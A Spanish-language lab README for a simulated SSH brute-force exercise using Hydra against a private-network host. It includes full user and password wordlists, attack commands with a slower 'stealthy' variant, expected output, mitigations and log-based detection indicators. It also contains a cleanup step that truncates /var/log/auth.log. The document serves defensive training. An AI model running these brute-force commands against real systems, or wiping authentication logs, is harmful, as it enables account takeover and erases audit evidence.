# AVISO IMPORTANTE

Este laboratorio es exclusivamente educativo y debe ejecutarse solo en entornos controlados, aislados y con autorizacion explicita del instructor o del propietario del sistema.

No utilices este material, diccionarios, comandos ni procedimientos contra sistemas, redes o servicios de terceros.

El objetivo es estudiar patrones de ataque, evidencia, deteccion y defensa dentro de un entorno de practica autorizado.

> Uso exclusivo en laboratorio autorizado.

---
# 🔬 Lab Hydra — Ataque Simulado SSH (Fuerza Bruta)

> **⚠️ ADVERTENCIA LEGAL Y ÉTICA**
> Este laboratorio debe ejecutarse **únicamente** en sistemas de tu propiedad o con autorización explícita por escrito. El uso de Hydra contra sistemas sin permiso es ilegal en la mayoría de países y puede acarrear sanciones penales. Los autores no asumen responsabilidad por el uso indebido.

---

## 📁 Archivos del Laboratorio

| Archivo | Descripción |
|---------|-------------|
| `dict_users.txt` | Lista de ~60 nombres de usuario comunes (root, admin, ubuntu, oracle, etc.) |
| `dict_passwords.txt` | Lista de ~52 contraseñas débiles y frecuentes (123456, password, qwerty, etc.) |
| `README.md` | Este documento |

---

## 🚀 Comando Principal

```bash
hydra -L dict_users.txt -P dict_passwords.txt ssh://192.168.1.18 -t 6
```

### 🔍 Desglose del comando

| Parámetro | Significado |
|-----------|-------------|
| `hydra` | Herramienta de fuerza bruta y auditoría de credenciales |
| `-L dict_users.txt` | **L**ista de usuarios: prueba cada nombre de usuario del archivo |
| `-P dict_passwords.txt` | **P**assword list: prueba cada contraseña del archivo |
| `ssh://192.168.1.18` | Protocolo **SSH** contra el host **192.168.1.18** (puerto 22 por defecto) |
| `-t 6` | **T**asks/threads: ejecuta 6 intentos en paralelo para acelerar el ataque |

### 🧠 ¿Qué está haciendo Hydra?

1. **Iteración combinada**: Toma el primer usuario (`root`) y lo prueba con las 52 contraseñas.
2. **Paralelismo**: Lanza 6 hilos simultáneos, es decir, prueba 6 combinaciones usuario+contraseña al mismo tiempo.
3. **Detección de éxito**: Si una combinación funciona, Hydra muestra `[22][ssh] host: 192.168.1.18   login: root   password: 123456` y detiene ese hilo.
4. **Continuación**: Pasa al siguiente usuario y repite hasta agotar todas las combinaciones (60 × 52 = **3.120 intentos**).

---

## 📥 Descarga de Archivos

### Opción A: Descarga directa

Descarga los archivos desde los siguientes enlaces:

- [dict_users.txt](sandbox:///mnt/agents/output/ssh-ids-ml/lab_hydra/dict_users.txt)
- [dict_passwords.txt](sandbox:///mnt/agents/output/ssh-ids-ml/lab_hydra/dict_passwords.txt)

### Opción B: Clonar/generar en tu máquina

```bash
# Crear carpeta del lab
mkdir -p ~/lab_hydra && cd ~/lab_hydra

# Copiar los archivos descargados aquí
# o generar los diccionarios manualmente:

cat > dict_users.txt << 'EOF'
root
admin
ubuntu
test
user
guest
oracle
postgres
mysql
ftp
www-data
sshd
mail
backup
operator
daemon
bin
sys
sync
shutdown
halt
news
uucp
proxy
www
irc
gnats
libuuid
messagebus
ntp
sssd
rtkit
saned
usbmux
pulse
lightdm
hplip
cups-browsed
systemd-network
systemd-resolve
systemd-timesync
lxd
landscape
pollinate
ansible
vagrant
docker
jenkins
git
svn
webmaster
support
helpdesk
nagios
zabbix
snmp
elasticsearch
kibana
logstash
EOF

cat > dict_passwords.txt << 'EOF'
123456
password
12345678
qwerty
12345
123456789
letmein
1234567
football
iloveyou
admin
welcome
monkey
login
abc123
111111
123123
password123
admin123
root123
ubuntu
1234
1q2w3e4r
sunshine
princess
adminadmin
qwerty123
dragon
master
hello123
freedom
whatever
qazwsx
trustno1
baseball
batman
superman
starwars
harley
hunter
ranger
thomas
robert
michael
jordan
maggie
buster
daniel
andrew
joshua
pepper
zaq12wsx
EOF
```

---

## ▶️ Ejecución del Ataque Simulado

### Paso 1: Verificar que Hydra está instalado

```bash
hydra -h
# Si no está instalado:
sudo apt update && sudo apt install -y hydra
```

### Paso 2: Confirmar que el objetivo es accesible

```bash
# Verificar que el host responde en el puerto SSH
nc -zv 192.168.1.18 22
# o
nmap -p 22 192.168.1.18
```

### Paso 3: Ejecutar el ataque

```bash
cd ~/lab_hydra

# Ataque completo (60 usuarios × 52 contraseñas = 3.120 intentos)
hydra -L dict_users.txt -P dict_passwords.txt ssh://192.168.1.18 -t 6
```

### Paso 4: Variaciones útiles

```bash
# Ataque contra un solo usuario (más rápido)
hydra -l root -P dict_passwords.txt ssh://192.168.1.18 -t 6

# Ataque con verbose (muestra cada intento en pantalla)
hydra -L dict_users.txt -P dict_passwords.txt ssh://192.168.1.18 -t 6 -V

# Ataque con guardado de resultados
hydra -L dict_users.txt -P dict_passwords.txt ssh://192.168.1.18 -t 6 -o resultados_hydra.txt

# Ataque con reintentos limitados por usuario
hydra -L dict_users.txt -P dict_passwords.txt ssh://192.168.1.18 -t 6 -f
# (-f detiene al encontrar la primera coincidencia por usuario)

# Ataque con puerto SSH custom (ej. 2222)
hydra -L dict_users.txt -P dict_passwords.txt ssh://192.168.1.18:2222 -t 6

# Ataque con timeout entre intentos (más sigiloso)
hydra -L dict_users.txt -P dict_passwords.txt ssh://192.168.1.18 -t 1 -w 5
# (-w 5 = espera 5 segundos entre intentos)
```

---

## 📊 Salida Esperada

### Si NO encuentra credenciales válidas:
```
[DATA] max 6 tasks per 1 server, overall 6 tasks, 3120 login tries (l:60/p:52), ~520 tries per task
[DATA] attacking ssh://192.168.1.18:22/
[STATUS] 3120.00 tries/min, 3120 tries in 00:01h, 0 to do in 00:01h, 6 active
1 of 1 target completed, 0 valid passwords found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-04-22 14:30:00
```

### Si ENCUENTRA una credencial válida:
```
[22][ssh] host: 192.168.1.18   login: root   password: 123456
[STATUS] attack finished for 192.168.1.18 (waiting for children to complete) ...
1 of 1 target successfully completed, 1 valid password found
```

---

## 🛡️ Mitigación en el Servidor Objetivo

Si eres el administrador del servidor `192.168.1.18`, estas son las contramedidas:

| Control | Comando/Configuración |
|---------|----------------------|
| **Fail2ban** | `sudo apt install fail2ban` + configurar jail SSH |
| **UFW** | `sudo ufw limit 22/tcp` (rate limiting) |
| **Clave pública** | Deshabilitar password auth en `/etc/ssh/sshd_config`: `PasswordAuthentication no` |
| **Puerto alterno** | Cambiar puerto SSH en `/etc/ssh/sshd_config`: `Port 2222` |
| **2FA** | Instalar `libpam-google-authenticator` |
| **Audit** | Revisar `/var/log/auth.log` para detectar patrones |

---

## 🧹 Limpieza Post-Laboratorio

```bash
# Limpiar logs de auth.log (opcional, para no contaminar datos)
sudo truncate -s 0 /var/log/auth.log

# Reiniciar servicio SSH para limpiar sesiones
sudo systemctl restart ssh

# Limpiar reglas de fail2ban si se activaron
sudo fail2ban-client unban --all 2>/dev/null || true
```

---

## � Interpretación Detallada de la Salida de Hydra

### Elementos Clave en la Salida

- **[DATA]**: Información inicial sobre el ataque.
  - `max 6 tasks per 1 server`: Máximo de 6 hilos por servidor.
  - `overall 6 tasks`: Total de tareas activas.
  - `3120 login tries (l:60/p:52)`: Total de intentos (60 usuarios × 52 contraseñas).
  - `~520 tries per task`: Intentos por hilo.

- **[STATUS]**: Progreso en tiempo real.
  - `3120.00 tries/min`: Velocidad de intentos por minuto.
  - `3120 tries in 00:01h`: Intentos completados en tiempo.
  - `0 to do`: Intentos restantes.
  - `6 active`: Hilos activos.

- **[22][ssh]**: Indicador de éxito.
  - `host: 192.168.1.18`: Servidor objetivo.
  - `login: root`: Usuario encontrado.
  - `password: 123456`: Contraseña encontrada.

- **Errores Comunes**:
  - `ERROR: No route to host`: El host no es accesible (firewall, red).
  - `ERROR: Connection refused`: Puerto SSH cerrado o servicio no corriendo.
  - `ERROR: Read failed`: Conexión interrumpida (posible bloqueo por fail2ban).
  - `WARNING: Restore file exists`: Hydra encontró un archivo de restauración de sesión anterior.

### Consejos para Interpretar
- Si el ataque es rápido y no encuentra nada, el servidor probablemente tiene contraseñas fuertes o autenticación por clave.
- Un ataque lento indica posibles limitaciones de red o defensas activas.
- Monitorea el `[STATUS]` para estimar tiempo restante.

---

## 📡 Monitoreo en Tiempo Real en la Máquina Destino

Para observar qué sucede en el servidor objetivo (`192.168.1.18`) durante el ataque, conecta vía SSH (o accede físicamente) y ejecuta comandos para ver los logs en tiempo real. Esto te permite ver los intentos de login fallidos generados por Hydra.

### Comando Principal: Ver Logs de Autenticación

```bash
# En Ubuntu/Debian (y la mayoría de distribuciones Linux)
sudo tail -f /var/log/auth.log

# En CentOS/RHEL/Fedora
sudo tail -f /var/log/secure

# En otras distros, busca en /var/log/ (ej. syslog, messages)
sudo tail -f /var/log/syslog
```

### Qué Verás en los Logs

- **Intentos Fallidos**: Aparecerán líneas como:
  ```
  Apr 22 14:30:00 server sshd[12345]: Failed password for root from 192.168.1.100 port 22 ssh2
  Apr 22 14:30:01 server sshd[12346]: Failed password for admin from 192.168.1.100 port 22 ssh2
  ```
  - `Failed password`: Indica un intento fallido.
  - `for root/admin/etc.`: Usuario probado.
  - `from 192.168.1.100`: IP del atacante (tu máquina ejecutando Hydra).

- **Bloqueos por Fail2ban**: Si tienes fail2ban activado:
  ```
  Apr 22 14:31:00 server fail2ban.actions[6789]: NOTICE [sshd] Ban 192.168.1.100
  ```

- **Éxito (si ocurre)**: Si Hydra encuentra credenciales válidas, verás:
  ```
  Apr 22 14:32:00 server sshd[12347]: Accepted password for root from 192.168.1.100 port 22 ssh2
  ```

### Consejos para Monitoreo
- Ejecuta `tail -f` en una terminal separada mientras Hydra corre en otra.
- Usa `grep` para filtrar: `sudo tail -f /var/log/auth.log | grep "Failed password"`.
- Si el servidor es remoto, conecta primero con SSH seguro antes de iniciar el ataque.
- Recuerda que estos logs pueden crecer rápidamente; usa `sudo truncate -s 0 /var/log/auth.log` para limpiar después (con precaución).

---

## �📚 Recursos Adicionales

- [Documentación oficial de Hydra](https://github.com/vanhauser-thc/thc-hydra)
- [OWASP Testing for Brute Force](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/04-Testing_for_Brute_Force.html)
- [CIS SSH Benchmarks](https://www.cisecurity.org/benchmark/ssh)

---


## Tecnicas Y Metodos Que Se Observan En Este Laboratorio

Esta seccion resume el enfoque tecnico que se estudia en el laboratorio, como complemento al flujo practico.

### Fuerza Bruta De Credenciales

Consiste en probar multiples combinaciones de usuario y contrasena hasta encontrar una coincidencia valida o agotar el diccionario disponible.

En el laboratorio se observa:

- repeticion de intentos fallidos
- alto volumen de autenticaciones en poco tiempo
- combinaciones sistematicas de usuarios y contrasenas

### Password Guessing

Se basa en probar contrasenas comunes o debiles sobre uno o varios usuarios probables.

Esto permite estudiar:

- credenciales predecibles
- patrones repetitivos en logs
- diferencias entre cuentas privilegiadas y cuentas comunes

### Generacion De Ruido Controlado

El laboratorio sirve para producir actividad observable y luego analizarla desde el punto de vista defensivo.

Esto ayuda a:

- capturar evidencia en logs
- medir frecuencia, volumen y repeticion
- alimentar ejercicios de correlacion y deteccion

### Observacion De Logs

Una parte central del ejercicio es aprender a leer la evidencia que dejan los intentos de autenticacion.

Se revisan elementos como:

- usuario objetivo
- IP origen
- horario del intento
- cantidad de fallos
- patron temporal de repeticion

### Correlacion Temporal

Los eventos aislados suelen tener poco valor por si solos. El analisis mejora cuando se observan en ventanas de tiempo.

Por eso este laboratorio sirve para identificar:

- muchos intentos en pocos minutos
- multiples usuarios desde una misma IP
- secuencias repetitivas de autenticacion fallida

### Indicadores Basicos De Abuso De Autenticacion

Entre los indicadores que se pueden estudiar estan:

- numero de intentos fallidos por minuto
- usuarios distintos probados desde un mismo origen
- horario atipico de actividad
- repeticiones sobre cuentas privilegiadas como `root`

Estos conceptos son utiles como base para ejercicios posteriores de deteccion, analitica y machine learning aplicado a ciberseguridad.
